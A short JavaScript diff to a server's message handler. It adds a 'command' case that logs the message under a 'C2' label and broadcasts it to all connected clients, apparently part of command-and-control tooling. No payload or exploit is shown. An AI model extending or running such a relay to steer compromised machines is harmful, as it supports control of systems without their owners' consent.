@@ -120,7 +120,11 @@ Headers: ${headers}
         
           case "json":
             handle_json(client, "json", data.message);
-          break
+          break;
+        case "command":
+          console.log(`C2: ${client}, Command: ${data.message}`);
+          broadcast(data.message);
+          break;
         }
     } catch (error) {
       console.log(error);
